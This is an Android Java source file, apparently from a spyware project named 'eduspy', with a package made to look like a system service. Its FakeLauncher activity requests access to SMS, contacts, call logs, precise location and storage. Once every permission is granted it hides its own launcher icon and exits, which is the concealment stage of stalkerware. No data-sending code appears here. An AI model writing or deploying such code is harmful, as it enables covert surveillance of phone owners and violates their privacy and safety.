package com.eduspy.systemservice;

import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class FakeLauncher extends AppCompatActivity {

    String[] permissions = {
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request permissions at runtime
        ActivityCompat.requestPermissions(this, permissions, 1);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        boolean allGranted = true;

        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            Toast.makeText(this, "Permissions Granted. Hiding App...", Toast.LENGTH_SHORT).show();
            hideAppIcon(); // Hide the app
            finish(); // Quit app
        } else {
            Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show();
        }
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, FakeLauncher.class);
        p.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
